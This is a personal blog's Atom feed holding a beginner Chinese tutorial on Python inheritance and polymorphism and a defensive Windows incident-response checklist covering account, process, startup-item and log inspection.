<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>A_Snail&#39;s Blog</title>
  
  <subtitle>人生南北多歧路，君向潇湘我向秦！</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-08-19T00:56:11.620Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>A_Snail</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>python 继承和多态</title>
    <link href="http://example.com/2023/08/18/python%20%E7%BB%A7%E6%89%BF%E5%92%8C%E5%A4%9A%E6%80%81/"/>
    <id>http://example.com/2023/08/18/python%20%E7%BB%A7%E6%89%BF%E5%92%8C%E5%A4%9A%E6%80%81/</id>
    <published>2023-08-18T05:50:05.737Z</published>
    <updated>2023-08-19T00:56:11.620Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python-继承和多态"><a href="#python-继承和多态" class="headerlink" title="python 继承和多态"></a>python 继承和多态</h1><h1 id="什么是继承？"><a href="#什么是继承？" class="headerlink" title="什么是继承？"></a>什么是继承？</h1><p>在生活中，大家都应该听过这个词，比如儿子继承他老子的财产，那么在python中也有继承，但是有不少人比较难理解继承这个东西。<br>在python，所有的类都默认继承<code>object</code>类，因此<code>object</code>类也被称为基类,其他的类称为派生类,在<code>python</code>中继承就是 子类可以继承父类中的所有的非私有方法</p><blockquote><p>什么是私有方法?</p></blockquote><p>是指在 Python 的面向对象开发过程中，对象的某些方法或者称为函数只想在对象的内部被使用，但不想在外部被访问到这些方法或函数。<br>即：私有方法是对象不愿意公开的方法或函数。<br>同理 私有属性也是类同<br>那么用一个简单的代码来理解一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 定一个一个公共性类 (</span></span><br><span class="line"><span class="keyword">class</span>   <span class="title class_">Person</span>():</span><br><span class="line">    <span class="comment"># 定义__init__初始化方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age,adress</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">        self.adress = adress</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">eat</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;i can eat food!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;i can speak!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义个性类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Teacher</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,name,age,adress</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line">        self.adress = adress</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">eat</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;i can eat food!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">speak</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;i can speak!&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__write</span>(<span class="params">self</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;i can wirte&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义个性类 Student  继承person类，发现也可以调用成功</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>(<span class="title class_ inherited__">Person</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = Person(<span class="string">&#x27;snail&#x27;</span>,<span class="number">21</span>,<span class="string">&#x27;贵州&#x27;</span>)</span><br><span class="line">teacher = Teacher(<span class="string">&#x27;tom&#x27;</span>,<span class="number">10</span>,<span class="string">&#x27;贵州&#x27;</span>)</span><br><span class="line">s1 = Student(<span class="string">&#x27;xiaowu&#x27;</span>,<span class="number">87</span>,<span class="string">&#x27;四川&#x27;</span>)</span><br><span class="line">s1.eat()</span><br><span class="line">s1.speak()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 继承可以继承父类中的所有非私有方法， 也就是这里的`__write`方法将不会被继承 `__` 是python中私有方法的语法定义 </span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么执行后你会发现即使<code>Student</code>类中并没有定义eat()方法和<code>speak()</code>方法 但是也同样能够输出 这就是继承<br>继承的语很简单 直接在类后面的括号里面跟上需要继承的类即可。</p><p>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">pass</span>  <span class="comment"># 这里自己写需要的方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">B</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">a.B中所有公共方法。</span><br></pre></td></tr></table></figure><p>那么我们想在父类继承来的方法里面执行子类的特有的代码怎么办,<br>这里就引入了新的名词<code>重写</code></p><p>那么什么是重写呢？</p><blockquote><p>我的理解是，从父类继承过来，只有父类的方法和属性，那么我自己想要在父类的基础上面修改方法和属性该怎么办呢，那么重写就是用来解决这个问题的。  也就是继承后，可以进行修改继承来的方法，  如果有系统的属性和方法，进行重写， 也就是从父类继承来的方法会进行重新定义。<br>例：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animals</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">eat</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;i can eat&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">call</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;i can call phone &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>(<span class="title class_ inherited__">Animals</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">eat</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27; i like eat gutouts&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span>(<span class="title class_ inherited__">Animals</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">eat</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;i can 捉老鼠&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wangcai = Dog()</span><br><span class="line">wangcai.eat()</span><br><span class="line">wangcai.call()</span><br><span class="line"></span><br><span class="line">miao = Cat()</span><br><span class="line">miao.eat()</span><br><span class="line">miao.call()</span><br></pre></td></tr></table></figure><p>运行后便可以理解什么是重写了，也就是不同的类继承同一个父类后，进行方法的重写，之后执行的结果与父类和另外的子类的结果不同。<br>那么问题又来啦，既然我们对父类的方法进行重写了，那如果我们还需要调用父类的方法，那该怎么办呢，对此，python引入了<code>super()</code>方法 </p><blockquote><p>super():调用父类的方法或属性,完整写法: <code>super().属性</code> 或者<code>super.方法 </code>就可以完成调用了</p></blockquote><p>调用例字:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Car</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, brand, model, color</span>):</span><br><span class="line">        self.brand = brand</span><br><span class="line">        self.model = model</span><br><span class="line">        self.color = color</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;i can run&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GasolineCar</span>(<span class="title class_ inherited__">Car</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, brand, model, color</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(brand, model, color)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;i can run with gas&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ElectricCar</span>(<span class="title class_ inherited__">Car</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, brand, model, color</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(brand, model, color)</span><br><span class="line">        <span class="comment"># 代表电池电量。</span></span><br><span class="line">        self.battery = <span class="number">70</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;i can run whith electric,remind<span class="subst">&#123;self.battery&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bmw = GasolineCar(<span class="string">&#x27;宝马&#x27;</span>, <span class="string">&#x27;x5&#x27;</span>, <span class="string">&#x27;白色&#x27;</span>)</span><br><span class="line">bmw.run()</span><br><span class="line"></span><br><span class="line">tesla = ElectricCar(<span class="string">&#x27;特斯拉&#x27;</span>, <span class="string">&#x27;model3&#x27;</span>, <span class="string">&#x27;红色&#x27;</span>)</span><br><span class="line">tesla.run()</span><br></pre></td></tr></table></figure><p>这里用车来做例子，我们发现我们这里都是用的父类的方法对车进行初始化的。也就是我们在子类中并没有重新写初始化的方法。而是调用父类中的。</p><h1 id="1-什么是多态"><a href="#1-什么是多态" class="headerlink" title="1.什么是多态"></a>1.什么是多态</h1><p>多态指的是一类实物有多种形态，<br>定义 多态是一种使用对象的方式，子类重写父类方法，调用不同子类对象的相同父类方法，可以产生不同的执行结果；</p><ol><li>多态依赖继承</li><li>子类方法必须要重写父类方法。<br>首先定义一个父类，其可能拥有多个子类对象，当我们调用一个公共方法时，传递的对象不同，则返回的结果不同。<br>好处，调用灵活，有了多台，可以更容易编写出通用的代码，做出通用的编程，以适应需求的不断变化。、</li></ol><p>不同对象访问相同方法，返回不同结果  就是多态</p><p>代码实现。<br>多态可以基于继承，也可以不基于继承。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Fruit</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">makejuice</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;i can make juice &#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Apple</span>(<span class="title class_ inherited__">Fruit</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">makejuice</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;i can make  apple juice &#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Banana</span>(<span class="title class_ inherited__">Fruit</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">makejuice</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;i can make Banana juice &#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Orange</span>(<span class="title class_ inherited__">Fruit</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">makejuice</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;i can make Orange juice &#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用多态。  定义一个service  公共方法接口</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">service</span>(<span class="params">obj</span>):</span><br><span class="line">    obj.makejuice()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># apple = Apple()</span></span><br><span class="line"><span class="comment"># apple.makejuice()  # 以往的方式，需要用一个调用一个</span></span><br><span class="line"><span class="comment"># banana = Banana()</span></span><br><span class="line"><span class="comment"># banana.makejuice()  # 橘子也是 一样</span></span><br><span class="line"><span class="comment"># orange = Orange()</span></span><br><span class="line"><span class="comment"># orange.makejuice()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用接口</span></span><br><span class="line">apple = Apple()</span><br><span class="line">banana = Banana()</span><br><span class="line">orange = Orange()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (apple,banana,orange):</span><br><span class="line">    service(i)</span><br></pre></td></tr></table></figure><p>这里的service就是多态的体现。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;python-继承和多态&quot;&gt;&lt;a href=&quot;#python-继承和多态&quot; class=&quot;headerlink&quot; title=&quot;python 继承和多态&quot;&gt;&lt;/a&gt;python 继承和多态&lt;/h1&gt;&lt;h1 id=&quot;什么是继承？&quot;&gt;&lt;a href=&quot;#什么是继承？&quot;</summary>
      
    
    
    
    <category term="Python" scheme="http://example.com/categories/Python/"/>
    
    
    <category term="Python" scheme="http://example.com/tags/Python/"/>
    
    <category term="爬虫" scheme="http://example.com/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>Windows的应急</title>
    <link href="http://example.com/2023/08/18/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    <id>http://example.com/2023/08/18/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</id>
    <published>2023-08-18T05:50:05.719Z</published>
    <updated>2023-08-19T02:49:07.895Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Windows的应急"><a href="#Windows的应急" class="headerlink" title="Windows的应急"></a>Windows的应急</h1><p>学习过程中看到师傅文章，所以顺便做了个思维导图 师傅太强了 原文链接已放文末。</p><h2 id="常见的应急响应事件分类。"><a href="#常见的应急响应事件分类。" class="headerlink" title="常见的应急响应事件分类。"></a>常见的应急响应事件分类。</h2><h3 id="web入侵"><a href="#web入侵" class="headerlink" title="web入侵"></a>web入侵</h3><ul><li><p>网页挂马</p></li><li><p>主页篡改</p></li><li><p>webshell</p></li></ul><h3 id="系统入侵"><a href="#系统入侵" class="headerlink" title="系统入侵"></a>系统入侵</h3><ul><li><p>病毒木马</p></li><li><p>勒索病毒</p></li><li><p>远控木马</p></li></ul><h3 id="网络攻击"><a href="#网络攻击" class="headerlink" title="网络攻击"></a>网络攻击</h3><ul><li><p>ddos</p></li><li><p>dns劫持</p></li><li><p>arp欺骗</p></li></ul><h2 id="windows入侵排查"><a href="#windows入侵排查" class="headerlink" title="windows入侵排查"></a>windows入侵排查</h2><h3 id="1-1-检查账号安全性"><a href="#1-1-检查账号安全性" class="headerlink" title="1.1 检查账号安全性"></a>1.1 检查账号安全性</h3><ul><li><ol><li>检查系统账号安全性。</li></ol></li><li><ol start="2"><li>查看服务器是否存在可疑或者新增账号</li></ol><ul><li><p>检查方法：</p><ul><li>Win+R打开运行窗口，输入lusrmgr.msc，查看是否有新增可疑的账号，如果有管理员群组里的新增账户，请立即禁用或者删掉</li></ul></li><li><p>管理员群组：</p><ul><li>Administrators</li></ul></li></ul></li><li><ol start="3"><li>查看服务器是否存在隐藏账号，克隆账号等。</li></ol><ul><li><p>检查方法：</p><ul><li><p>打开注册表：查看对应键值</p><ul><li>第一步：Win+R打开运行窗口，输入regedit打开注册表编辑器</li><li>第二步：选择 HKEY_LOCAL_MACHINE&#x2F;SAM&#x2F;SAM，默认无法查看</li><li>第三步：右击SAM，权限，选择当前用户(一般是Administrator),将权限勾选为完全控制，然后确定并且关闭注册表</li><li>第四步：选择 HKEY_LOCAL_MACHINE&#x2F;SAM&#x2F;SAM&#x2F;Domains&#x2F;Account&#x2F;Users;</li><li>第五步：在Names项下可以看到实例所有用户名</li><li>Tips:如果出现本地账户中没有的账户，即为隐藏账户，在确认为非系统用户的前提下，可删除此用户</li></ul></li><li><p>使用D盾_web查杀工具，集成了对克隆账号的检测功能</p></li></ul></li></ul></li><li><p>结合日志，查看管理员登录时间、用户名是否存在异常。</p><ul><li><p>方法：</p><ul><li><ol><li>Win+R打开运行窗口，输入eventvwr.msc，打开事件查看器。</li></ol></li><li><ol start="2"><li>导出Windows日志–安全，利用Log Parser进行分析</li></ol></li></ul></li></ul></li></ul><h3 id="1-2-检查异常端口、进程"><a href="#1-2-检查异常端口、进程" class="headerlink" title="1.2 检查异常端口、进程"></a>1.2 检查异常端口、进程</h3><ul><li><ol><li>netstat -ano 查看目前的网络连接，定位可疑的ESTABLISHED状态</li></ol></li><li><ol start="2"><li>根据netstat 确定PID，再通过tasklist | findstr “PID” 定位进程</li></ol></li><li><ol start="3"><li>Win+R打开运行窗口，输入msinfo32，在【软件环境】-&gt; 【正在运行的任务】通过PID和进程名定位，就可以看到进程的详细信息，比如进程路径、进程ID、文件创建日期、启动时间等。</li></ol></li><li><ol start="4"><li>在我们想要杀死进程的时候，可能因为进程绑定了系统服务，无法杀死，通过tasklist &#x2F;svc 查看进程对应的服务。Win+R打开运行窗口，输入serivces.msc，关闭对应服务，然后在杀死进程。</li></ol></li><li><ol start="5"><li>查看Windows服务所对应的端口：</li></ol><ul><li>%system%&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;services (一般%system%就是C:\Windows)</li></ul></li><li><p>Tips：当我们通过第3步确定落地文件之后，可以将可疑文件上传到威胁情报社区去做威胁情报检测。</p></li></ul><h3 id="1-3-检查启动项、计划任务、服务"><a href="#1-3-检查启动项、计划任务、服务" class="headerlink" title="1.3 检查启动项、计划任务、服务"></a>1.3 检查启动项、计划任务、服务</h3><ul><li><p>1、检查服务器是否有异常的启动项</p><ul><li><ol><li>登录服务器，单机【开始】-&gt; 【所有程序】-&gt;【启动】，默认情况下此目录是一个空目录，确认是否有非业务程序在该目录下</li></ol></li><li><ol start="2"><li>Win+R打开运行窗口，输入msconfig，查看是否存在命名异常的启动项目，是则取消勾选该启动项，并到命令中显示的路径除文件</li></ol></li><li><ol start="3"><li>Win+R打开运行窗口，输入regedit打开注册表，查看开机启动项是否正常，注册表项如下：</li></ol><ul><li>HKEY_CURRENT_USER\SOFTWARE\Micorsoft\Windows\CurrentVersion\Run</li><li>HKEY_LOCAL_MACHINE\SOFTWARE\Micorsoft\Windows\CurrentVersion\Run</li><li>HKEY_LOCAL_MACHINE\SOFTWARE\Micorsoft\Windows\CurrentVersion\RunOnce检查右侧是否有启动异常的项目，有则删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</li></ul></li><li><ol start="4"><li>利用安全软件查看启动项、开机时间管理等</li></ol></li><li><ol start="5"><li>Win+R打开运行窗口，输入gpedit.msc打开本地组策略编辑器，单机【Windows】-&gt;【脚本(启动&#x2F;关机)】-&gt;【启动】&#x2F;【关机】查看是否有启动项</li></ol></li></ul></li><li><p>2、检查计划任务</p></li><li><p>3、服务自启动</p></li></ul><h3 id="1-4-检查系统相关信息"><a href="#1-4-检查系统相关信息" class="headerlink" title="1.4 检查系统相关信息"></a>1.4 检查系统相关信息</h3><ul><li><p>1、查看系统版本以及补丁信息</p><ul><li>检查方法：Win+R打开运行窗口，输入systeminfo，查看系统信息</li></ul></li><li><p>2、查找可疑目录及文件</p><ul><li><ol><li>查看用户目录，新建账号会在这个目录生成一个用户目录</li></ol><ul><li>Windows Server 2003 : C:\Documents and Settings</li><li>Windows Server 2008R2 : C:\Users\</li></ul></li><li><ol start="2"><li>Win+R 打开运行窗口，输入%UserProfile%\Recent，分析最近打开文件</li></ol></li><li><ol start="3"><li>在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件</li></ol></li><li><ol start="4"><li>回收站、浏览器下载目录、浏览器历史记录</li></ol></li><li><ol start="5"><li>修改时间在创建时间之前的为可疑文件</li></ol></li></ul></li><li><p>3、得到发现Webshell、远控木马的创建时间，找同一时间范围内创建的文件</p><ul><li><ol><li>利用Registry Workshop 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件</li></ol></li><li><ol start="2"><li>利用计算机自带的文件搜索功能，指定修改时间进行搜索</li></ol></li></ul></li></ul><h3 id="1-5-自动化查杀"><a href="#1-5-自动化查杀" class="headerlink" title="1.5 自动化查杀"></a>1.5 自动化查杀</h3><ul><li><p>1、病毒查杀</p><ul><li>检查方法：下载安全软件，更新最新病毒库，进行全盘扫描</li></ul></li><li><p>2、webshell查杀</p><ul><li>检查方法：选择具体的站点路径进行webshell查杀，建议使用两款或者多款查杀工具同时查杀，可以相互补充规则库的不足</li></ul></li></ul><h3 id="1-6-日志分析"><a href="#1-6-日志分析" class="headerlink" title="1.6 日志分析"></a>1.6 日志分析</h3><ul><li><p>1、系统日志</p><ul><li><ol><li>前提：开启审核策略，若日后出现系统故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵的信息等。</li></ol></li><li><ol start="2"><li>Win+R打开运行窗口，输入eventvwr.msc，打开事件查看器</li></ol></li><li><ol start="3"><li>导出应用程序日志、安全日志、系统日志，利用Log Parser进行分析</li></ol></li></ul></li><li><p>2、web访问日志</p><ul><li><ol><li>找到中间件的web日志，打包到本地方便进行分析</li></ol></li><li><ol start="2"><li>Windows推荐使用EmEditor进行日志分析；Linux推荐使用shell命令组合查询分析</li></ol></li></ul></li><li><p>常见日志存放路径</p><ul><li><p>1、apache服务器</p><ul><li>Windows : &lt;Apache安装目录&gt;\logs\access.log</li><li>Linux :&#x2F;usr&#x2F;local&#x2F;apache&#x2F;logs&#x2F;access.log</li><li>若不存在，参考Apache配置文件httpd.conf中相关配置</li></ul></li><li><p>2、tomcat服务器</p><ul><li><p>日志文件通常位于Tomcat安装目录下的logs文件夹内，若不存在，则参考Tomcat配置文件Server.xml中的相关配置 ，如：</p><ul><li><Valve className="org.apache.catalina.valves.AccessLogValve"></li><li>directory&#x3D;”logs” prefix&#x3D;”localhost_access_log.”</li><li>suffix&#x3D;”.txt”</li><li>pattern&#x3D;”common” resolveHosts&#x3D;”false”&#x2F;&gt;</li></ul></li></ul></li><li><p>3、IIS服务器</p><ul><li>默认位置：%systemroot%\system32\logfiles\ 可自由设置</li><li>默认日志命名方式：ex+年份的末两位数字+月份+日期+.log</li></ul></li><li><p>4、Nginx</p><ul><li>日志存储路径在Nginx配置文件中，其中：</li><li>Access_log变量规定了日志存放路径与名字，以及日志格式名称，默认值”access_log”</li></ul></li><li><p>5、Jboss</p><ul><li>默认不做访问日志记录</li><li>修改${JBOSS_HOME}&#x2F;server&#x2F;default&#x2F;deploy&#x2F;jbossweb.sar&#x2F;server.xml（不同版本文件位置不一样）</li><li>日志保存在${JBOSS_HOME}&#x2F;server&#x2F;default&#x2F;log&#x2F;下，前缀为：localhost_access_log</li></ul></li></ul></li></ul><h3 id="关于配置文件"><a href="#关于配置文件" class="headerlink" title="关于配置文件"></a>关于配置文件</h3><ul><li>Tomcat: server.xml 会有服务器端口配置，日志配置等</li><li>Apache: httpd.conf是apache主要配置文件，包括端口，模块启用，日志配置等</li><li>Nginx: nginx.conf是主要配置文件，会有端口，重写，代理等配置，也会有日志配置等。</li><li>IIS: web.config 是主要配置文件，通过IIS界面修改的配置会保存到web.config里，包括重写等操作，日志配置一般不变，通过界面就可查看</li></ul><p>参考链接： <a class="link"   href="https://blog.csdn.net/weixin_44727454/article/details/125605281" >https://blog.csdn.net/weixin_44727454/article/details/125605281<i class="fas fa-external-link-alt"></i></a><br>下面附上思维导图 </p><p>我好菜  太废物了  淦</p><p><img                       lazyload                     alt="image"                     data-src="https://blog-1254096303.cos.ap-chengdu.myqcloud.com/2023/03/23/641b33e3635d6.png"                      alt="Windows的应急.png"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Windows的应急&quot;&gt;&lt;a href=&quot;#Windows的应急&quot; class=&quot;headerlink&quot; title=&quot;Windows的应急&quot;&gt;&lt;/a&gt;Windows的应急&lt;/h1&gt;&lt;p&gt;学习过程中看到师傅文章，所以顺便做了个思维导图 师傅太强了 原文链接已放文末</summary>
      
    
    
    
    <category term="攻防演练" scheme="http://example.com/categories/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/"/>
    
    <category term="蓝队" scheme="http://example.com/categories/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/%E8%93%9D%E9%98%9F/"/>
    
    <category term="应急响应" scheme="http://example.com/categories/%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83/%E8%93%9D%E9%98%9F/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="蓝队" scheme="http://example.com/tags/%E8%93%9D%E9%98%9F/"/>
    
    <category term="应急" scheme="http://example.com/tags/%E5%BA%94%E6%80%A5/"/>
    
  </entry>
  
  <entry>
    <title>内存马的一些粗浅的思维导图总结</title>
    <link href="http://example.com/2023/08/18/%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E4%B8%80%E4%BA%9B%E7%B2%97%E6%B5%85%E7%9A%84%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E6%80%BB%E7%BB%93/"/>
    <id>http://example.com/2023/08/18/%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E4%B8%80%E4%BA%9B%E7%B2%97%E6%B5%85%E7%9A%84%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E6%80%BB%E7%BB%93/</id>
    <published>2023-08-18T05:50:05.702Z</published>
    <updated>2023-08-18T06:11:14.997Z</updated>
    
